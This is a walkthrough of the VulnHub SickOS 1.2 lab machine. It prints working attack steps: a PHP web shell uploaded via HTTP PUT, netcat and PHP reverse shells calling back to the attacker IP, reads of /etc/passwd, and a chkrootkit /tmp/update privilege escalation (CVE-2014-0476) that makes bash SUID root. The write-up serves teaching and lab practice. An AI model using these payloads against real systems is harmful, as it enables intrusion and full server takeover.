# SickOS 1.2 – VulnHub Walkthrough

Target: SickOS 1.2  
Attacker Machine: Ubuntu/Kali  
Adapter: VirtualBox (Host-Only Network)

---

# 1. Initial Enumeration

We begin by scanning the target machine to identify open ports and services.

```bash
nmap -A -p- <IP>
```

### Explanation

- **-A**  Enables OS detection, version detection, script scanning, and traceroute  
- **-p-**  Scans all ports (1–65535)

After identifying a web server, we perform directory enumeration.

```bash
dirsearch -u http://<IP>
```

This reveals a directory:

```
/test/
```

---

# 2. HTTP Methods Enumeration

We check which HTTP methods are allowed on the server.

Using tools like:

```bash
curl -X OPTIONS http://<IP>/test/
```

The **PUT method is enabled**.

### PUT METHOD

- The **PUT method** is used to upload files to the server.
- Normally, it should be **restricted or authenticated**.
- Misconfiguration allows attackers to upload arbitrary files.

---

# 3. Gaining Initial Access (Web Shell)

Since PUT is enabled, we upload a PHP web shell.

```php
<?php system($_GET["cmd"]); ?>
```

- `$_GET["cmd"]`  Takes input from URL parameter  
- `system()`  Executes system commands on the server  

This gives us **remote command execution (RCE)**.

**note**
-RCE is the act of a server executing your command
-Webshell is a persistent script (like a PHP file) that allows you to send those commands via a browser
-Reverse Shell is a live connection where the server "calls back" to your machine to give you an interactive terminal.

---

# 4. Verifying Command Execution

We test the shell using:

```bash
curl "http://192.168.56.108/test/shell.php?cmd=id"
```

### Explanation

- `curl`  Sends HTTP request from terminal  
- `?cmd=id`  Executes the `id` command on the server  

### Output

```
uid=33(www-data)
```

We now have access as the **www-data user** (web server user).
www-data is the default user and group on Debian-based Linux systems 

---

# 5. Attempted Reverse Shell (Failed)

We attempt to get a full interactive shell.

### Start Listener

```bash
nc -lvnp 4444
```

### Explanation

- `nc`  Netcat tool  
- `-l`  Listen mode  
- `-v`  Verbose  
- `-n`  No DNS resolution  
- `-p 4444`  Listening on port 4444  

---

### Trigger Reverse Shell

```bash
curl --get --data-urlencode 'cmd=nc 192.168.56.102 4444 -e /bin/bash' \
http://192.168.56.108/test/shell.php
```

### Explanation

- `--get`  Send request as GET  
- `--data-urlencode`  Encodes payload  
- `nc ... -e /bin/bash`  Executes bash and connects back  

---

### Result

The reverse shell **failed**.

---

# 6. Network Verification

We verify connectivity using ping:

```bash
curl --get --data-urlencode 'cmd=ping -c 1 192.168.56.102' \
http://192.168.56.108/test/shell.php
```

### Output

```
100% packet loss
```

### Conclusion

- No outbound connection allowed  
- Reverse shell is not possible  

---

# 7. User Enumeration

```bash
curl --get --data-urlencode 'cmd=cat /etc/passwd' \
http://192.168.56.108/test/shell.php
```

### Explanation

- `/etc/passwd`  Stores user account information  

### Found user

```
john:x:1000:1000:/home/john:/bin/bash
```

---

# 8. Cron Job Enumeration

```bash
curl --get --data-urlencode 'cmd=cat /etc/crontab' \
http://192.168.56.108/test/shell.php
```

### Important Entry

```
run-parts --report /etc/cron.daily
```

### What is Cron?

- Cron is a **task scheduler** in Linux  
- Executes commands/scripts automatically at set intervals  

### Insight

- Scripts in `/etc/cron.daily` are executed as **root**

---

# 9. Inspecting Cron Directory

```bash
curl --get --data-urlencode 'cmd=ls -la /etc/cron.daily' http://192.168.56.108/test/shell.php
```

### Found

```
chkrootkit
```

---

# 10. Analyzing chkrootkit Script

```bash
curl --get --data-urlencode 'cmd=cat /etc/cron.daily/chkrootkit' http://192.168.56.108/test/shell.php
```

### Key Line

```
eval $CHKROOTKIT
```

---

# 11. Understanding chkrootkit

### What is chkrootkit?

- A **security tool** used to detect rootkits on Linux systems  
- Normally runs as root for deep system inspection  

### Intended Behavior

- Scan system files  
- Detect suspicious activity  

---

# 12. Binary Analysis

```bash
curl --get --data-urlencode 'cmd=strings /usr/sbin/chkrootkit | grep tmp' \
http://192.168.56.108/test/shell.php
```

### Explanation

- `strings`  Extract readable text from binary  
- `grep tmp`  Search for `/tmp` references  

### Output

```
/tmp/update
```

---

# 13. **CVE-2014-0476**

 is a local privilege escalation flaw in the chkrootkit tool caused by an unquoted variable in its shell script.
-An attacker can place a malicious file named update in the /tmp directory, which the script will then execute with root permissions.
- chkrootkit references `/tmp/update`
- `/tmp` is **world-writable**
- Cron executes chkrootkit as **root**

---

### Why this is dangerous

#### Intended Design

- `/tmp` is used for temporary files  

#### Error

- No validation of files in `/tmp`  
- Trusts user-controlled location  

---

An attacker can:

1. Create a malicious script in `/tmp/update`
2. Wait for cron execution
3. Get code executed as **root**

---

# 14. Exploitation

### Step 1: Create Malicious Script

```bash
curl --get --data-urlencode 'cmd=echo "chmod +s /bin/bash" > /tmp/update' http://192.168.56.108/test/shell.php
```

- `echo`  Writes command into file  
- `chmod +s /bin/bash`  Sets SUID bit

**SUID**: Set User ID bit is a special type of permission in LI9NUX operating systems assigned to executable files.
When enabled, it allows a user to run an executable with the permissions of the file's owner rather than their own

---

### Step 2: Make Script Executable

```bash
curl --get --data-urlencode 'cmd=chmod +x /tmp/update' http://192.168.56.108/test/shell.php
```

### Explanation

- `chmod +x`  Makes file executable  

---

### Step 3: Wait for Cron

Once cron runs:

- `/tmp/update` executes as root  
- `/bin/bash` becomes SUID  

---

# 15. Privilege Escalation

### Verify SUID

```bash
curl --get --data-urlencode 'cmd=ls -l /bin/bash' http://192.168.56.108/test/shell.php
```

### Output

```
-rwsr-sr-x 1 root root /bin/bash
```

### What is SUID?

- SUID allows a file to run with **owner’s privileges**  
- Here → root privileges  

---

# 16. Get Root Shell

```bash
curl --get --data-urlencode 'cmd=/bin/bash -p -c "id"' \
http://192.168.56.108/test/shell.php
```

### Explanation

- `-p` → Preserve privileges  
- `-c` → Execute command  

### Output

```
uid=0(root)
```

---

# 17. Root Access

### List Root Directory

```bash
curl --get --data-urlencode 'cmd=/bin/bash -p -c "ls /root"' \
http://192.168.56.108/test/shell.php
```

---

### Retrieve Flag

```bash
curl --get --data-urlencode 'cmd=/bin/bash -p -c "cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt"' \
http://192.168.56.108/test/shell.php
```
#  Alternate Exploitation

In addition to the previous privilege escalation method, we can also gain a **reverse shell directly** using a PHP payload.

---

# 1. Reverse Shell Payload

We use the following PHP code:

```php
<?php
$sock=fsockopen("192.168.56.102",443);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

---

# 2. Payload

### `fsockopen("192.168.56.102",443)`

- Opens a TCP connection to the attacker machine  
- `192.168.56.102` → Attacker IP  
- `443` → Port (chosen to bypass restrictions, since it's commonly allowed)

---

### `proc_open("/bin/sh -i", ...)`

- Starts an interactive shell (`/bin/sh -i`)  
- Redirects:
  - **stdin (0)**  socket  input
  - **stdout (1)** socket  output
  - **stderr (2)**  socket error 

This effectively sends the shell over the network connection.

---

# 3. Setting Up Listener

On the attacker machine, start a listener:

```bash
nc -lvnp 443
```

### Explanation

- `nc`  Netcat  
- `-l`  Listen mode  
- `-v`  Verbose  
- `-n`  No DNS  
- `-p 443`  Listening on port 443  

---

# 4. Uploading the Payload

Since the **PUT method is enabled**, we upload the PHP reverse shell:

```bash
curl -X PUT http://192.168.56.108/test/shell.php \
--data '<?php
$sock=fsockopen("192.168.56.102",443);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'
```

---

# 5. Triggering the Shell

Now we simply enter the file in web

Once accessed:

- The PHP code executes  
- A connection is made to the attacker  
- The shell is spawned  

---

# 6. Receiving the Shell

On the listener:

```
nc -lnvp 443
$
```

You now have a shell as:

```
www-data
```

---

---

# 19. Key Takeaways

### 1. HTTP PUT Misconfiguration

- Intended for file upload  
- Should require authentication  
- Misconfigured → allows arbitrary file upload  

---

### 2. Remote Command Execution (RCE)

- PHP `system()` executes user input  
- No sanitization → full command execution  

---

### 3. Cron Job Misconfiguration

- Runs scripts automatically as root  
- Dangerous if scripts rely on unsafe paths  

---

### 4. chkrootkit Vulnerability

- References `/tmp/update`  
- No validation  
- Executes attacker-controlled file  

---

### 5. World-Writable Directory Abuse

- `/tmp` accessible by all users  
- Common privilege escalation vector  

---
